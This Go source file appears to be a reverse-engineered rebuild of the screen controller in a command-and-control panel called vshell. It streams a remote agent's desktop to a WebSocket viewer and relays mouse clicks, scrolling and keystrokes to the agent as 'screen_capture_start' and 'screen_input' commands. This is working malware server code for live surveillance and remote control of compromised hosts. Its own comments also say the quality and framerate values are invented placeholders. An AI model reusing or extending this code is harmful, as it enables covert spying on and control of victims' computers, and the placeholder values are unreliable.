// Package controllers — 屏幕控制器，根据当前逆向证据重建；行为等价性仍需逐项验证。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	Ws  0x18eeee0   GET /api/screen/ws?id=<id>&quality=<q>&token=<token>  屏幕直播 WebSocket
//
// 前端内嵌 JS：`ws://host/api/screen/ws?id="+y+"&quality="+f+"&token="+g`。
//
// 前端只负责打开 WebSocket 并把每帧二进制数据 inflate 后交给 <img>
// （static/assets/vl9djw6e1.js：`const O=te(r.data)`，te = pako inflate）。
// 会话建立、采集启停、清晰度换算都在服务端完成——这就是 FUN_018eeee0 的职责：
// 它按客户端 ID 建立屏幕会话，再把服务端 ↔ 代理的流式载荷原样转发给浏览器。
package controllers

import (
	"encoding/json"
	"log"
	"net/http"
	"strconv"

	"vshell/c2engine"

	"github.com/gorilla/websocket"
)

// ScreenController 提供 Agent 屏幕直播。
type ScreenController struct {
	ApiBaseController
}

// ServeScreenViewer 处理一条已通过 token 校验的屏幕查看者连接
// （GET /api/screen/ws?id=<clientID>&quality=<q>）。由 router 直接调用，原因
// 同终端端点（beego 控制器生命周期无法承载 Hijack）。
//
// ServeScreenViewer serves one authenticated screen viewer connection.
func ServeScreenViewer(w http.ResponseWriter, r *http.Request) {
	id, _ := strconv.ParseInt(r.URL.Query().Get("id"), 10, 64)
	quality := r.URL.Query().Get("quality")
	serveScreenViewer(w, r, id, quality)
}

// Ws 是历史控制器入口（路由器已改走 ServeScreenViewer），对齐信息保留：
// 反编译（0x18eeee0）：id = JsonGetInt("id")，quality = JsonGetStr("quality")
// （7 字符，DAT 0x1bdbbb8 前 7 字节）；GetClient(id)（FUN_01198ac0）失败 →
// "未找到客户端"（FUN_0119ebe0，状态机 B start=0 seed=0xe6 加解密，UTF-8 已解）；
// 客户端协议（+0x20/+0x28）仅 dns/doh/dot → 错误（屏幕流走 DNS 通道）；
// 随后 WebSocket 升级（FUN_01636a40）并注册读写处理器。
func (c *ScreenController) Ws() {
	c.Ctx.Output.SetStatus(http.StatusNotFound)
	_ = c.Ctx.Output.Body([]byte("use GET /api/screen/ws (websocket upgrade)"))
}

// serveScreenViewer 校验客户端后升级连接并建立屏幕会话。
func serveScreenViewer(w http.ResponseWriter, r *http.Request, id int64, quality string) {
	client := c2engine.GetEngine().GetClient(id)
	if client == nil {
		http.Error(w, "未找到客户端", http.StatusBadRequest)
		return
	}
	// 原版只允许非 DNS 通道的客户端做屏幕流（屏幕数据量不适合 DNS 隧道）。
	// 客户端协议字段为 dns/doh/dot 时拒绝，与反编译分支一致。
	if isDNSOnlyTransport(client.Type) {
		http.Error(w, "不支持 DNS、OSS 协议", http.StatusBadRequest)
		return
	}

	conn, err := panelUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[screen] upgrade failed for client %d: %v", id, err)
		return
	}
	serveScreenStream(conn, id, quality)
}

// ---- 引擎阶段对齐 ----

// screenCaptureParams 把前端的清晰度枚举映射成采集参数。
//
// ⚠ 占位值，不是对齐 / PLACEHOLDER VALUES, NOT ALIGNED.
// 前端确实发送这三个字面量（static/assets/vn-sfWjBP.js 的 清晰度 单选：
// 高/中/低 → "big"/"normal"/"small"，默认 "normal"），但**数值本身未经反编译
// 验证**：原版对应的质量/帧率换算函数尚未定位（占位 — 来源函数未知），因此
// 这里的三组数字是按直观大小关系编造的。
// 已知后果：quality 是字符串，任何把它当整数解析的写法都得到 0，所以下游若
// 用 Atoi(quality) 取值，该参数恒为死值——本函数绕过该问题靠的是枚举匹配。
// ⚠ 不要把 FUN_019146e0 的语义用在这里：那是 po 字符串解码器的写字节闭包
// （out_i = v_i − seed_i），屏幕压缩与它无关。共享原语可以，据此推导质量参数
// 就是又一次 0x458f00 式的误判。
//
// The SPA sends these three literals (清晰度 radio in static/assets/vn-sfWjBP.js:
// 高/中/低 → "big"/"normal"/"small", default "normal"), but the NUMBERS are
// invented: the original's quality/framerate conversion has not been located
// (placeholder — source function not yet identified). Note `quality` is a
// string, so any int-conversion of it yields 0 and would be a dead parameter.
func screenCaptureParams(quality string) (q, fps int) {
	switch quality {
	case "big":
		return 90, 10
	case "small":
		return 30, 2
	default: // "normal" (SPA default when the route has no quality segment)
		return 60, 5
	}
}

// screenCaptureStartCommand 构造屏幕采集启动命令（agent dispatchScreenCommand）。
func screenCaptureStartCommand(quality string) string {
	q, fps := screenCaptureParams(quality)
	return "screen_capture_start quality=" + itoa(q) + " fps=" + itoa(fps)
}

// serveScreenStream 把一条已升级的屏幕 WebSocket 与代理采集流对接。
func serveScreenStream(conn *websocket.Conn, clientID int64, quality string) {
	viewer := c2engine.NewWSStreamViewer(conn, c2engine.StreamScreen, clientID)
	c2engine.RegisterViewer(c2engine.StreamScreen, clientID, viewer)
	defer func() {
		c2engine.UnregisterViewer(c2engine.StreamScreen, clientID, viewer)
		c2engine.ClearStreamSession(c2engine.StreamScreen, clientID)
		_ = conn.Close()
	}()

	task, err := engineExecShellAsync(clientID, screenCaptureStartCommand(quality))
	if err != nil {
		log.Printf("[screen] capture start failed for client %d: %v", clientID, err)
		return
	}
	c2engine.SetStreamSession(c2engine.StreamScreen, clientID, &c2engine.StreamSession{
		Viewer:   viewer,
		ClientID: clientID,
		TaskID:   task.ID,
	})
	defer engineExecShellAsync(clientID, "screen_capture_stop")

	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}
		if cmd, ok := screenViewerCommand(data); ok {
			if _, err := engineExecShellAsync(clientID, cmd); err != nil {
				log.Printf("[screen] dispatch failed for client %d: %v", clientID, err)
				return
			}
		}
	}
}

// screenViewerCommand 把前端屏幕页的上行控制帧转成代理侧命令。
// 前端协议（static/assets/vl9djw6e1.js）：
//
//	{"type":"1",absX,absY,canvasWidth,canvasHeight}  鼠标绝对坐标 → 点击
//	{"type":"2"} / {"type":"3",keyCode} / {"type":"4"}  按下 / 按键 / 右键
//	{"type":"5"} / {"type":"6"}                       拖拽开始 / 结束
//	{"type":"7",direction,amount}                     滚轮
//	{"type":"8",key,modifiers}                        组合键
//	{"type":"10"}                                     关闭查看
//
// 复刻端把这些事件编码进 screen_input 命令（agent 侧按前缀解析）。
func screenViewerCommand(data []byte) (string, bool) {
	var msg map[string]interface{}
	if err := json.Unmarshal(data, &msg); err != nil {
		return "", false
	}
	t, _ := msg["type"].(string)
	switch t {
	case "1":
		x := jsonNumber(msg["absX"])
		y := jsonNumber(msg["absY"])
		return "screen_input move x=" + itoa(x) + " y=" + itoa(y), true
	case "2", "3", "4":
		return "screen_input click button=" + itoa(screenButton(t)), true
	case "6":
		return "screen_input click button=1", true
	case "7":
		dir, _ := msg["direction"].(string)
		amount := jsonNumber(msg["amount"])
		return "screen_input scroll dir=" + dir + " amount=" + itoa(amount), true
	case "8":
		key, _ := msg["key"].(string)
		return "screen_input key=" + key, true
	case "10":
		return "screen_capture_stop", true
	}
	return "", false
}

// screenButton 把前端事件类型映射到鼠标按键（1=左 2=中 3=右）。
func screenButton(eventType string) int {
	switch eventType {
	case "4":
		return 3
	case "3":
		return 1
	default:
		return 1
	}
}

// jsonNumber 读取 JSON 数字字段（缺省 0）。
func jsonNumber(v interface{}) int {
	if f, ok := v.(float64); ok {
		return int(f)
	}
	return 0
}

// isDNSOnlyTransport 判断客户端是否使用无法承载屏幕流的通道。
// DNS/DoH/DoT 隧道带宽不足以承载屏幕帧，原版屏幕控制器对这些协议直接报错。
func isDNSOnlyTransport(clientType string) bool {
	switch clientType {
	case "dns", "doh", "dot":
		return true
	}
	return false
}
